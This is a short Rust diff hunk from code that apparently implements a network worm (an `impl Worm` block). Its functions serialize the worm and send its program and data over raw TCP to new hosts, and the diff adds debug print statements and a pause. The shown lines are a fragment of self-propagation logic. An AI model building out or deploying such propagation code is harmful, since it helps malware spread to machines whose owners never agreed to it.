@@ -95,12 +95,16 @@ impl Worm {
         let client = reqwest::Client::new();
         let port = self.calculate_port(host.as_bytes());
 
+        println!("Sending data to: {}:{}", host, port);
         let stream = TcpStream::connect(&format!("{}:{}", host, port)).expect("Could not bind to socket");
         let res = serde_json::to_writer(stream, &self);
     }
 
     pub fn send_to_host(&self, host: &str) {
         self.send_prog_to_host(host);
+        println!("Program is sent to new host: {:?}", host);
+        thread::sleep_ms(1000);
+        println!("Data will be sent to new host: {:?}", host);
         self.send_data_to_host(host);
     }
 
